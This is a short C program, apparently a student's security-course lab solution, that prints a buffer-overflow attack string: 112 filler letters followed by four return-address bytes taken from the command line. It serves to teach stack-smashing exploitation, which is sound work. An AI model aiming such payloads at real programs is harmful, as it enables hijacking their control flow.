//usr/bzhang/attack-string.c/Users/bozhang/Desktop/security/proj3/attack-string.c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include<string.h>
int main(int argc,  char* argv[])
{
    char* target_address[20];
    char attack_string[150];
    char string;
    char r;
    int i;
    for(i=0;i<112;i++)
    {    srand(time(0));
        r = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[rand() % 26];
        //printf("%c\n",r);
        attack_string[i] = r;
        //sleep(1);
    }
    attack_string[i] = '\0';
    printf("%s",attack_string);
    
    int a=(unsigned char)strtol(argv[1],NULL,16);
    int b=(unsigned char)strtol(argv[2],NULL,16);
    int c=(unsigned char)strtol(argv[3],NULL,16);
    int d=(unsigned char)strtol(argv[4],NULL,16);
    printf("%c%c%c%c",a,b,c,d);
    return 0;
}
